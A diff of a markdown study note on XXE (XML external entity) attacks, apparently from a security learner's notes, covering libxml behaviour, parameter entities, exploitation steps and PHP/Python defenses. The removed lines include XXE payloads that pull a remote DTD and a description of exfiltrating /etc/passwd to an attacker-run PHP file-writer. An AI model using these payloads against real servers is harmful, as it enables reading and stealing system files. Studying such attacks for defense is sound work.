@@ -36,28 +36,13 @@ version after 2.9.0 default not to parse the external entity
 Therefore, we can use the code `print "libxml version: ".LIBXML_DOTTED_VERSION."\n";` to make sure  
 
 3. Parameter entity： `<!ENTITY %name "value>"`  
-```xml
-// exp.dtd: <!ENTITY next SYSTEM "file://.txt">
-<!DOCTYPE pwnch[
-  <!ENTITY %var SYSTEM "http://...../exp.dtd">
-  %var;
-]>
-<root>&next;</root>
-```
-While importing external entity, we also can bring into the parameter in `exp.dtd`.  
-> By the way, the first two lines of code `file:///` are protocol, and the last line mean root dir.
+`%` means reference of parameter entity in dtd.  
+`&` means reference in xml doc.  
 
 ## Exploit
 1. Vul to XXE?  
 Input a xml to see whether it is parsed  
-2. Support of External entity?
-```
-<!DOCTYPE ANY [
-<!ENTITY % name SYSTEM "url">
-%name;
-]>
-```  
-  
+2. Support of External entity?  
 3. Return -> Simple  
 **php and XXE**  
 ```php
@@ -89,9 +74,6 @@ test.php
 ```php
 file_put_contents("test.txt",$_GET['a']);
 ```
-The whole process of exploit：server parsed my xml input, and import dtd of my domain while parsing `remote`.  
-On `xxe.dtd`, there are `all` and `send` parameter entities, while parsing `send` entity, it would request to my `test.php` with `/etc/passwd` from the first part.  
-At the end, `test.php` would put content of `/etc/passwd` into the file of `test.txt`.  
 
 ## Defense
 ```php
@@ -104,5 +86,4 @@ xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
 [更詳細的內容可以參考這篇的漏洞修復與防禦](https://thief.one/2017/06/20/1/)
 
 ## Reference
-* Kaibro's slides  
 * [浅谈XXE漏洞攻击与防御](https://thief.one/2017/06/20/1/)
